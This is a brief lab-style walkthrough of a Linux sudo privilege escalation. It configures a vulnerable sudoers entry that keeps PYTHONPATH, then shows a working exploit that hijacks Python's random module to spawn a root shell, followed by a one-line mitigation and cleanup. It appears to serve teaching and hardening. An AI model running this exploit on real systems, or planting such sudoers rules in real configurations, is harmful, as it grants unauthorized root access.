# Setup

```sh
# root
cp /etc/sudoers /etc/sudoers.bak
adduser sudo2
echo "sudo2 ALL=(ALL) NOPASSWD: /usr/bin/python /home/sudo2/script.py" >> /etc/sudoers
echo "Defaults env_keep += PYTHONPATH" >> /etc/sudoers
echo 'import random; print(random.randint(1, 10))' > /home/sudo2/script.py
```

# Exploit

```bash
echo 'import os' > /tmp/random.py
echo 'os.system("/bin/bash -p")' >> /tmp/random.py

export PYTHONPATH=/tmp
sudo python /home/sudo2/script.py
```


# Mitigate

```bash
# Remove env_keep += PYTHONPATH
```


# Clean Up

```bash
deluser sudo2 --remove-home
cp /etc/sudoers.bak /etc/sudoers
```